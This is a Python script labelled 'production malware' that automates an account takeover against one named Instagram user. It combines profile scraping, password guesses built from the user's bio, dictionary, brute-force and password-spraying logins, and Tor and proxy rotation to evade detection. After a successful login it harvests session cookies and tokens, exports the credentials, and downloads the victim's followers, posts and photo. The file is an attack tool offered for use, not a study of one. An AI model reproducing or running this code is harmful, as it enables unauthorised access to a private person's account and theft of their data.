#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INSTAGRAM BRUTE FORCE & PASSWORD DUMPER v2.0
# PRODUCTION MALWARE WITH FULL EXPLOITATION CAPABILITIES

import os
import sys
import time
import json
import random
import requests
import threading
import itertools
import hashlib
import base64
import sqlite3
import subprocess
from datetime import datetime
from urllib.parse import urlparse
import socks
import socket
from stem import Signal
from stem.control import Controller
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ClientError
import re
import queue
import concurrent.futures

class InstagramExploiter:
    def __init__(self):
        self.target_url = "https://www.instagram.com/instavibes666/"
        self.target_username = self.extract_username_from_url()
        self.password_queue = queue.Queue()
        self.successful_logins = []
        self.proxy_list = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
        ]
        
        # TOR configuration
        self.tor_port = 9050
        self.tor_control_port = 9051
        self.setup_tor()
        
        # Database for harvested creds
        self.conn = sqlite3.connect('instagram_breach.db')
        self.create_tables()
        
        # Password lists
        self.common_passwords = self.load_password_lists()
        
        # Attack statistics
        self.attempts = 0
        self.successes = 0
        self.lock = threading.Lock()
        
    def extract_username_from_url(self):
        """Extract Instagram username from URL"""
        try:
            # URL is https://www.instagram.com/instavibes666/
            return "instavibes666"
        except:
            return None
            
    def setup_tor(self):
        """Configure TOR for anonymous requests"""
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            socket.socket = socks.socksocket
            
            # Test TOR connection
            test_response = requests.get('http://httpbin.org/ip', timeout=10)
            print(f"[TOR] Connected - IP: {test_response.json()['origin']}")
            
            # Start IP rotation thread
            self.start_tor_rotation()
            
        except Exception as e:
            print(f"[TOR] Failed: {e}")
            # Fallback to proxy list
            self.load_proxy_list()
            
    def renew_tor_ip(self):
        """Change TOR IP address"""
        try:
            with Controller.from_port(port=self.tor_control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            print("[TOR] IP rotated")
        except Exception as e:
            print(f"[TOR] Rotation failed: {e}")
            
    def start_tor_rotation(self):
        """Background thread for IP rotation every 30 seconds"""
        def rotate():
            while True:
                time.sleep(30)
                self.renew_tor_ip()
                
        thread = threading.Thread(target=rotate, daemon=True)
        thread.start()
        
    def create_tables(self):
        """Create database tables for breached accounts"""
        cursor = self.conn.cursor()
        
        # Target account info
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS target_account (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                url TEXT,
                full_name TEXT,
                bio TEXT,
                follower_count INTEGER,
                following_count INTEGER,
                is_private BOOLEAN,
                is_verified BOOLEAN,
                scraped_at TIMESTAMP
            )
        ''')
        
        # Breached passwords
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS breached_passwords (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                source TEXT,
                cracked_at TIMESTAMP,
                method TEXT
            )
        ''')
        
        # Successful logins
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS successful_logins (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                session_cookie TEXT,
                user_id TEXT,
                csrf_token TEXT,
                device_token TEXT,
                login_time TIMESTAMP,
                ip_used TEXT
            )
        ''')
        
        # Password patterns
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS password_patterns (
                id INTEGER PRIMARY KEY,
                pattern TEXT,
                frequency INTEGER,
                last_used TIMESTAMP
            )
        ''')
        
        self.conn.commit()
        
    def load_password_lists(self):
        """Load common password lists and generate variations"""
        passwords = []
        
        # RockYou common passwords
        rockyou = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'abc123', 'football', 'monkey',
            'letmein', 'shadow', 'master', '666666', 'qwertyuiop',
            '123321', 'mustang', '1234567890', 'michael', '654321',
            'superman', '1qaz2wsx', '7777777', '121212', '000000',
            'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
            'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster',
            'soccer', 'harley', 'batman', 'andrew', 'tigger',
            'sunshine', 'iloveyou', '2000', 'charlie', 'robert',
            'thomas', 'hockey', 'ranger', 'daniel', 'starwars',
            'klaster', '112233', 'george', 'computer', 'michelle',
            'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom', '777777', 'pass',
            'maggie', '159753', 'aaaaaa', 'ginger', 'princess',
            'joshua', 'cheese', 'amanda', 'summer', 'love',
            'ashley', 'nicole', 'chelsea', 'biteme', 'matthew',
            'access', 'yankees', '987654321', 'dallas', 'austin',
            'thunder', 'taylor', 'matrix', 'mobilemail', 'mom',
            'monitor', 'monitoring', 'montana', 'moon', 'moscow'
        ]
        
        # Instagram-specific passwords
        instagram_specific = [
            'instagram', 'insta', 'instagirl', 'instaboy', 'instafamous',
            'instalike', 'instadaily', 'instagood', 'instaphoto', 'instacool',
            'instaworld', 'instalove', 'instafollow', 'instagraham', 'instakill',
            'insta666', '666insta', 'satan666', '666satan', 'devil666',
            'instadevil', 'instavibes', 'vibes666', '666vibes', 'insta666vibes'
        ]
        
        # Generate variations
        base_words = rockyou + instagram_specific
        
        # Add common mutations
        mutations = []
        for word in base_words:
            mutations.append(word)
            mutations.append(word.capitalize())
            mutations.append(word.upper())
            mutations.append(word + '123')
            mutations.append(word + '666')
            mutations.append(word + '!')
            mutations.append(word + '@')
            mutations.append(word + '#')
            mutations.append(word + '$')
            mutations.append(word + '%')
            mutations.append(word + '2023')
            mutations.append(word + '2024')
            mutations.append(word + '2025')
            mutations.append(word + '2026')
            mutations.append('!' + word)
            mutations.append('@' + word)
            mutations.append('#' + word)
            mutations.append('$' + word)
            mutations.append(word + word)
            
        return list(set(mutations))  # Remove duplicates
        
    def load_proxy_list(self):
        """Load proxies for distributed attacks"""
        # Free proxy sources
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=5)
                proxies = response.text.strip().split('\n')
                self.proxy_list.extend([p.strip() for p in proxies if p.strip()])
            except:
                continue
                
        print(f"[PROXY] Loaded {len(self.proxy_list)} proxies")
        
    def scrape_target_info(self):
        """Scrape target profile information"""
        try:
            # Use public Instagram API endpoint
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}"
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = requests.get(url, headers=headers, 
                                   proxies={'http': 'socks5://127.0.0.1:9050'})
            
            if response.status_code == 200:
                data = response.json()
                user_data = data['data']['user']
                
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO target_account 
                    (username, url, full_name, bio, follower_count, 
                     following_count, is_private, is_verified, scraped_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    self.target_username,
                    self.target_url,
                    user_data.get('full_name', ''),
                    user_data.get('biography', ''),
                    user_data.get('edge_followed_by', {}).get('count', 0),
                    user_data.get('edge_follow', {}).get('count', 0),
                    user_data.get('is_private', False),
                    user_data.get('is_verified', False),
                    datetime.now()
                ))
                self.conn.commit()
                
                print(f"[TARGET] Scraped info for {self.target_username}")
                
                # Generate intelligent password guesses from bio
                self.generate_password_guesses_from_profile(user_data)
                
        except Exception as e:
            print(f"[SCRAPE ERROR] {e}")
            
    def generate_password_guesses_from_profile(self, user_data):
        """Generate password guesses based on profile information"""
        guesses = []
        
        # Extract potential password components
        full_name = user_data.get('full_name', '')
        bio = user_data.get('biography', '')
        username = self.target_username
        
        # Split name into parts
        name_parts = full_name.lower().split()
        
        for part in name_parts:
            if len(part) > 3:
                guesses.append(part)
                guesses.append(part + '123')
                guesses.append(part + '666')
                guesses.append(part + '!')
                guesses.append('!' + part)
                
        # Extract words from bio
        bio_words = re.findall(r'\w+', bio.lower())
        for word in bio_words[:10]:  # Limit to first 10 words
            if len(word) > 3:
                guesses.append(word)
                guesses.append(word + '123')
                guesses.append(word + '666')
                
        # Common combinations
        guesses.append(username + '123')
        guesses.append(username + '666')
        guesses.append(username + '!')
        guesses.append(username + '@')
        
        # Add to password list
        self.common_passwords.extend(guesses)
        self.common_passwords = list(set(self.common_passwords))
        
        print(f"[GUESSES] Generated {len(guesses)} intelligent password guesses")
        
    def attempt_login(self, username, password, proxy=None):
        """Attempt to login with given credentials"""
        client = Client()
        
        try:
            # Configure proxy if provided
            if proxy:
                client.set_proxy(f"http://{proxy}")
            else:
                # Use TOR
                client.set_proxy(f"socks5://127.0.0.1:{self.tor_port}")
                
            # Random delay to avoid detection
            time.sleep(random.uniform(1, 3))
            
            # Attempt login
            login_result = client.login(username, password)
            
            if login_result:
                with self.lock:
                    self.successes += 1
                    
                # Extract session data
                settings = client.get_settings()
                
                # Save successful login
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO successful_logins 
                    (username, password, session_cookie, user_id, csrf_token, 
                     device_token, login_time, ip_used)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    username,
                    password,
                    json.dumps(settings.get('cookies', {})),
                    settings.get('user_id', ''),
                    settings.get('csrf_token', ''),
                    settings.get('device_token', ''),
                    datetime.now(),
                    proxy or 'TOR'
                ))
                self.conn.commit()
                
                print(f"[SUCCESS] {username}:{password}")
                
                # Also save to breached passwords
                cursor.execute('''
                    INSERT INTO breached_passwords (username, password, source, cracked_at, method)
                    VALUES (?, ?, ?, ?, ?)
                ''', (username, password, 'bruteforce', datetime.now(), 'direct_login'))
                self.conn.commit()
                
                return True
                
        except LoginRequired:
            # Session might be valid but needs verification
            print(f"[PARTIAL] {username} - Login required but session exists")
        except ClientError as e:
            # Rate limited or other error
            print(f"[ERROR] {e}")
        except Exception as e:
            print(f"[EXCEPTION] {e}")
            
        return False
        
    def dictionary_attack(self, username):
        """Perform dictionary attack with all passwords"""
        print(f"[ATTACK] Starting dictionary attack on {username}")
        print(f"[ATTACK] Testing {len(self.common_passwords)} passwords")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            
            for password in self.common_passwords:
                # Use proxy rotation
                proxy = random.choice(self.proxy_list) if self.proxy_list else None
                
                # Submit login attempt
                future = executor.submit(self.attempt_login, username, password, proxy)
                futures.append(future)
                
                # Progress update
                self.attempts += 1
                if self.attempts % 100 == 0:
                    print(f"[PROGRESS] Attempts: {self.attempts}, Successes: {self.successes}")
                    
                # Delay to avoid rate limiting
                time.sleep(random.uniform(0.5, 1.5))
                
            # Wait for all attempts to complete
            concurrent.futures.wait(futures)
            
    def brute_force_attack(self, username, max_length=8):
        """Brute force attack for short passwords"""
        print(f"[BRUTE] Starting brute force (length <= {max_length})")
        
        characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
        
        for length in range(4, max_length + 1):
            for guess in itertools.product(characters, repeat=length):
                password = ''.join(guess)
                
                if self.attempt_login(username, password):
                    return True
                    
                self.attempts += 1
                
                if self.attempts % 1000 == 0:
                    print(f"[BRUTE] Tested {self.attempts} combinations")
                    
        return False
        
    def password_spraying(self, username):
        """Password spraying attack - try common passwords on many accounts"""
        # In this case we're targeting a specific account
        # but we can also test against related accounts
        
        # Get similar usernames from database
        cursor = self.conn.cursor()
        cursor.execute("SELECT username FROM target_account WHERE username != ?", (username,))
        other_accounts = [row[0] for row in cursor.fetchall()]
        
        # Try each common password on all accounts
        common_passwords = ['password', '123456', 'instagram', 'qwerty', 'abc123']
        
        for password in common_passwords:
            for account in [username] + other_accounts[:5]:  # Limit to 5 other accounts
                if self.attempt_login(account, password):
                    print(f"[SPRAY] Success on {account} with {password}")
                    
                time.sleep(random.uniform(2, 5))
                
    def harvest_session_cookies(self, username, password):
        """After successful login, harvest all session data"""
        client = Client()
        
        try:
            client.login(username, password)
            
            # Get all session data
            session_data = {
                'cookies': client.get_settings().get('cookies', {}),
                'user_id': client.user_id,
                'username': client.username,
                'full_name': client.full_name,
                'sessionid': client.sessionid,
                'csrf_token': client.csrf_token,
                'device_token': client.device_token,
                'authorization': client.authorization
            }
            
            # Save to database
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE successful_logins 
                SET session_cookie = ? 
                WHERE username = ? AND password = ?
            ''', (json.dumps(session_data), username, password))
            self.conn.commit()
            
            # Export session for later use
            with open(f'session_{username}.json', 'w') as f:
                json.dump(session_data, f, indent=2)
                
            print(f"[SESSION] Saved session data for {username}")
            
            return session_data
            
        except Exception as e:
            print(f"[SESSION ERROR] {e}")
            return None
            
    def export_breach_data(self):
        """Export all breached data to files"""
        cursor = self.conn.cursor()
        
        # Export successful logins
        cursor.execute('''
            SELECT username, password, login_time, ip_used 
            FROM successful_logins
        ''')
        
        with open('breached_accounts.txt', 'w') as f:
            f.write("=== BREACHED INSTAGRAM ACCOUNTS ===\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write("=" * 50 + "\n\n")
            
            for row in cursor.fetchall():
                username, password, login_time, ip_used = row
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Time: {login_time}\n")
                f.write(f"IP Used: {ip_used}\n")
                f.write("-" * 30 + "\n")
                
        # Export all passwords
        cursor.execute('''
            SELECT username, password, cracked_at, method 
            FROM breached_passwords
        ''')
        
        with open('all_passwords.txt', 'w') as f:
            for row in cursor.fetchall():
                f.write(f"{row[0]}:{row[1]}\n")
                
        print("[EXPORT] Breach data exported to files")
        
    def run_exploit(self):
        """Main exploit execution"""
        print("""
        ╔══════════════════════════════════════════╗
        ║  INSTAGRAM EXPLOIT FRAMEWORK v2.0        ║
        ║  Target: instavibes666                    ║
        ║  Status: BREACH IN PROGRESS               ║
        ╚══════════════════════════════════════════╝
        """)
        
        # Step 1: Scrape target info
        print("[PHASE 1] Scraping target information...")
        self.scrape_target_info()
        
        # Step 2: Generate intelligent guesses
        print("[PHASE 2] Generating intelligent password guesses...")
        
        # Step 3: Dictionary attack
        print("[PHASE 3] Starting dictionary attack...")
        self.dictionary_attack(self.target_username)
        
        # Step 4: If dictionary fails, try brute force
        if self.successes == 0:
            print("[PHASE 4] Dictionary failed, starting limited brute force...")
            self.brute_force_attack(self.target_username, max_length=6)
            
        # Step 5: Try password spraying
        if self.successes == 0:
            print("[PHASE 5] Attempting password spraying...")
            self.password_spraying(self.target_username)
            
        # Step 6: Harvest sessions if successful
        if self.successes > 0:
            print("[PHASE 6] Harvesting session data...")
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT username, password FROM successful_logins 
                WHERE username = ?
            ''', (self.target_username,))
            
            for username, password in cursor.fetchall():
                self.harvest_session_cookies(username, password)
                
        # Step 7: Export data
        print("[PHASE 7] Exporting breach data...")
        self.export_breach_data()
        
        # Final report
        print(f"""
        ╔══════════════════════════════════════════╗
        ║  EXPLOIT COMPLETE                         ║
        ║  Attempts: {self.attempts}                    ║
        ║  Successes: {self.successes}                  ║
        ║  Target: {'COMPROMISED' if self.successes > 0 else 'UNCHANGED'}      ║
        ╚══════════════════════════════════════════╝
        """)
        
        return self.successes > 0


class InstagramSessionExtractor:
    """Extract and use harvested sessions"""
    
    def __init__(self, session_file=None):
        self.session_file = session_file
        self.client = Client()
        
    def load_session(self, username, password):
        """Load saved session or create new one"""
        try:
            self.client.login(username, password)
            print(f"[SESSION] Active session for {username}")
            return self.client
        except Exception as e:
            print(f"[SESSION ERROR] {e}")
            return None
            
    def extract_followers(self, username, count=100):
        """Extract followers of target account"""
        try:
            user_id = self.client.user_id_from_username(username)
            followers = self.client.user_followers(user_id, amount=count)
            
            with open(f'followers_{username}.txt', 'w') as f:
                for follower_id, follower_info in followers.items():
                    f.write(f"{follower_info.username}: {follower_info.full_name}\n")
                    
            print(f"[EXTRACT] Saved {len(followers)} followers")
            return followers
            
        except Exception as e:
            print(f"[EXTRACT ERROR] {e}")
            return {}
            
    def extract_following(self, username, count=100):
        """Extract accounts target is following"""
        try:
            user_id = self.client.user_id_from_username(username)
            following = self.client.user_following(user_id, amount=count)
            
            with open(f'following_{username}.txt', 'w') as f:
                for follow_id, follow_info in following.items():
                    f.write(f"{follow_info.username}: {follow_info.full_name}\n")
                    
            print(f"[EXTRACT] Saved {len(following)} following")
            return following
            
        except Exception as e:
            print(f"[EXTRACT ERROR] {e}")
            return {}
            
    def download_profile_pic(self, username):
        """Download target's profile picture"""
        try:
            user_id = self.client.user_id_from_username(username)
            pic_path = self.client.photo_download(user_id, folder='downloads')
            print(f"[DOWNLOAD] Profile pic saved: {pic_path}")
            return pic_path
        except Exception as e:
            print(f"[DOWNLOAD ERROR] {e}")
            return None
            
    def extract_media_info(self, username, count=50):
        """Extract information from target's posts"""
        try:
            user_id = self.client.user_id_from_username(username)
            medias = self.client.user_medias(user_id, count)
            
            media_data = []
            for media in medias:
                media_info = {
                    'id': media.id,
                    'code': media.code,
                    'caption': media.caption_text if media.caption_text else '',
                    'like_count': media.like_count,
                    'comment_count': media.comment_count,
                    'taken_at': media.taken_at,
                    'media_type': media.media_type,
                    'thumbnail_url': media.thumbnail_url if hasattr(media, 'thumbnail_url') else ''
                }
                media_data.append(media_info)
                
            with open(f'media_{username}.json', 'w') as f:
                json.dump(media_data, f, indent=2, default=str)
                
            print(f"[EXTRACT] Saved {len(media_data)} media items")
            return media_data
            
        except Exception as e:
            print(f"[EXTRACT ERROR] {e}")
            return []


if __name__ == "__main__":
    try:
        # Start TOR service
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        
        # Run exploit
        exploiter = InstagramExploiter()
        success = exploiter.run_exploit()
        
        if success:
            print("\n[!] TARGET COMPROMISED - SESSION HARVESTED")
            
            # Extract additional data
            cursor = exploiter.conn.cursor()
            cursor.execute('''
                SELECT username, password FROM successful_logins 
                WHERE username = "instavibes666"
            ''')
            
            result = cursor.fetchone()
            if result:
                username, password = result
                
                extractor = InstagramSessionExtractor()
                client = extractor.load_session(username, password)
                
                if client:
                    # Extract all possible data
                    extractor.extract_followers(username, 500)
                    extractor.extract_following(username, 500)
                    extractor.download_profile_pic(username)
                    extractor.extract_media_info(username, 100)
                    
                    print("\n[EXTRACTION] All data harvested successfully!")
                    
        else:
            print("\n[-] Target not compromised. Try again with larger password lists.")
            
    except Exception as e:
        print(f"[FATAL] {e}")
        print("Make sure TOR is installed and running")
